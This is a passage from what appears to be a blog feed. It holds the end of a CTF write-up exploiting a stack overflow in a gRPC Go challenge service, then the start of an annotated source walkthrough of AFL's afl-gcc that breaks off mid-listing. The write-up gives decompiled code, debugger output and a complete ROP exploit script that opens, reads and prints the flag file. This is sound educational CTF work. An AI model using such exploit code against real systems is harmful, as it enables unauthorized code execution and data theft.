class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterRequest</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">4444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>.noptrdata:0000000000C22E62</code> protobuf</p></blockquote><p><del></del>PWN</p><p></p><ul><li>Whoami: </li><li>RoleChange: ,change3,</li><li>Repeater: </li></ul><p>,,.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:1337&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">1</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure><p>,,</p><p> <code>repeater_request(cyclic(0x28))</code> ,0x30</p><p>repeater,,</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( tab == off_9799C0 )   <span class="comment">// request.tab = RepeaterRequest</span></span><br><span class="line">  &#123;</span><br><span class="line">    v99 = a3;</span><br><span class="line">    <span class="keyword">if</span> ( qword_C94B80 == <span class="number">3</span> )   <span class="comment">// role=3 </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  base64 </span></span><br><span class="line">v100 = *(<span class="type">string</span> *)(*(_QWORD *)v99-&gt;Request.data + <span class="number">40</span>LL);</span><br><span class="line"><span class="built_in">len</span> = v100.<span class="built_in">len</span>;</span><br><span class="line">v102 = encoding_base64__ptr_Encoding_DecodeString(qword_C62CA0, v100);</span><br><span class="line">ptr = v102<span class="number">.0</span>.ptr;</span><br><span class="line">v92 = v102<span class="number">.0</span>.<span class="built_in">len</span>;</span><br><span class="line"><span class="built_in">cap</span> = v102<span class="number">.0</span>.<span class="built_in">cap</span>;</span><br><span class="line">v76[<span class="number">0</span>] = v8;  <span class="comment">// </span></span><br><span class="line">v76[<span class="number">1</span>] = v8;  </span><br><span class="line">v94 = v76;</span><br><span class="line">v95 = <span class="number">32</span>LL;</span><br><span class="line">v96 = <span class="number">32</span>LL;</span><br><span class="line">v50 = v76;</span><br><span class="line">v51 = v102<span class="number">.0</span>.ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// go Unsafe </span></span><br><span class="line"><span class="comment">// v50</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>LL; i &lt; (__int64)(<span class="number">3</span> * (<span class="built_in">len</span> &gt;&gt; <span class="number">2</span>)); ++i )</span><br><span class="line">&#123;</span><br><span class="line">*(_BYTE *)v50 = *v51;</span><br><span class="line">v50 = (__int128 *)((char *)v50 + <span class="number">1</span>);</span><br><span class="line">++v51;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>,,sibp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> RDI  0xc00002832c  0x333231 /* <span class="string">&#x27;123&#x27;</span> */</span><br><span class="line"> RSI  0xc0001bb628  0x0</span><br><span class="line"> RSP  0xc0001bb5e0  0xc0001aa000  0x4847464544434241 (<span class="string">&#x27;ABCDEFGH&#x27;</span>)</span><br><span class="line">*RIP  0x7ee024  movzx r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line">  0x7ee024    movzx  r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee028    mov    byte ptr [rsi], r10b</span><br><span class="line">   0x7ee02b    inc    rax</span><br><span class="line">   0x7ee02e    lea    rsi, [r8 + 1]</span><br><span class="line">   0x7ee032    lea    rdi, [r9 + 1]</span><br><span class="line">   0x7ee036    cmp    rax, rdx</span><br><span class="line">   0x7ee039    jl     0x7ee01e                      &lt;0x7ee01e&gt;</span><br><span class="line">    </span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line">pwndbg&gt; p/x 0xc0001bb6e8-0xc0001bb628</span><br><span class="line"><span class="variable">$2</span> = 0xc0</span><br></pre></td></tr></table></figure><p>ROP: ORWflag,syscall.</p><p>WP,</p><ul><li> nc orw</li><li>rpc</li></ul><p>:fd.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:23334&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># role_change_request(1)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># role_change_request(2)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040452c</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401537</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000422398</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004101e6</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000461bd1</span></span><br><span class="line">flag = <span class="number">0x00000000007ef68d</span></span><br><span class="line">bss_buf = <span class="number">0xC6CF60</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xc0</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># open(&quot;flag&quot;, 0) -&gt; syscall(2, &#x27;flag&#x27;, 0)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, flag,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">10</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit 1</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">60</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">repeater_request(base64.b64encode(payload))</span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://blog.wm-team.cn/index.php/archives/72/">DubheCTF 2024 By W&amp;M</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>afl-gcc</title>
      <link href="/2024/03/09/afl-gcc/"/>
      <url>/2024/03/09/afl-gcc/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><p><strong>aflgdb</strong></p><h1 id="afl-gcc-as"><a href="#afl-gcc-as" class="headerlink" title="afl gcc &amp;&amp; as"></a>afl gcc &amp;&amp; as</h1><blockquote><p></p></blockquote><p>afl-gcc  gcc, g++, clang, clang++  afl-clang, afl-g++  afl-gcc </p><p>afl-gcc  afl-as afl-as  AFL_PATH </p><h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>afl-gcc </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// isatty: 0-1</span></span><br><span class="line">  <span class="comment">// 2: stderr    </span></span><br><span class="line">  <span class="comment">//  QUIET afl</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isatty</span>(<span class="number">2</span>) &amp;&amp; !<span class="built_in">getenv</span>(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span></span><br><span class="line">         <span class="string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span></span><br><span class="line">         <span class="string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">         <span class="string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,</span><br><span class="line">         BIN_PATH, BIN_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  afl-as </span></span><br><span class="line">  <span class="built_in">find_as</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// afl-gcc</span></span><br><span class="line">  <span class="built_in">edit_params</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// execvp: </span></span><br><span class="line">  <span class="comment">// execvp()execvp()</span></span><br><span class="line">  <span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><p> afl-as </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// argv0 afl-gcc</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">find_as</span><span class="params">(u8* argv0)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  AFL_PATH</span></span><br><span class="line">  u8 *afl_path = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PATH&quot;</span>);</span><br><span class="line">  u8 *slash, *tmp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// AFL_PATH path</span></span><br><span class="line">  <span class="keyword">if</span> (afl_path) &#123;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/as&quot;</span>, afl_path);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// accessas</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = afl_path;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//  &#x27;/&#x27;</span></span><br><span class="line">  <span class="comment">// /usr/bin/afl-gcc =&gt; /afl-gcc</span></span><br><span class="line">  slash = <span class="built_in">strrchr</span>(argv0, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (slash) &#123;</span><br><span class="line"></span><br><span class="line">    u8 *dir;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="comment">// /usr/bin/afl-gcc =&gt; /usr/bin\0afl-gcc</span></span><br><span class="line">    <span class="comment">// strdup  dir = /usr/bin</span></span><br><span class="line">    *slash = <span class="number">0</span>;</span><br><span class="line">    dir = <span class="built_in">ck_strdup</span>(argv0);</span><br><span class="line">    *slash = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/afl-as&quot;</span>, dir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(tmp, X_OK)) &#123;</span><br><span class="line">      as_path = dir;</span><br><span class="line">      <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ck_free</span>(tmp);</span><br><span class="line">    <span class="built_in">ck_free</span>(dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fallback afl-gcc  AFL_PATH </span></span><br><span class="line">  <span class="comment">// AFL_PATH  Makefile  &quot;/usr/local/lib/afl&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(AFL_PATH <span class="string">&quot;/as&quot;</span>, X_OK)) &#123;</span><br><span class="line">    as_path = AFL_PATH;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Unable to find AFL wrapper binary for &#x27;as&#x27;. Please set AFL_PATH&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Makefile<code>gcc -D</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PREFIX     ?= /usr/local</span><br><span class="line">BIN_PATH    = <span class="variable">$(PREFIX)</span>/bin</span><br><span class="line">HELPER_PATH = <span class="variable">$(PREFIX)</span>/lib/afl</span><br><span class="line">DOC_PATH    = <span class="variable">$(PREFIX)</span>/share/doc/afl</span><br><span class="line">MISC_PATH   = <span class="variable">$(PREFIX)</span>/share/afl</span><br><span class="line"></span><br><span class="line"><span class="comment"># PROGS intentionally omit afl-as, which gets installed elsewhere.</span></span><br><span class="line"></span><br><span class="line">PROGS       = afl-gcc afl-fuzz afl-showmap afl-tmin afl-gotcpu afl-analyze</span><br><span class="line">SH_PROGS    = afl-plot afl-cmin afl-whatsup</span><br><span class="line"></span><br><span class="line">CFLAGS     ?= -O3 -funroll-loops</span><br><span class="line">CFLAGS     += -Wall -D_FORTIFY_SOURCE=2 -g -Wno-pointer-sign \</span><br><span class="line">      -DAFL_PATH=\<span class="string">&quot;<span class="variable">$(HELPER_PATH)\&quot;</span> -DDOC_PATH=\&quot;<span class="variable">$(DOC_PATH)\&quot;</span> \</span></span><br><span class="line"><span class="string">      -DBIN_PATH=\&quot;<span class="variable">$(BIN_PATH)\&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="edit-param"><a href="#edit-param" class="headerlink" title="edit_param"></a>edit_param</h3><p> <code>__APPLE__</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 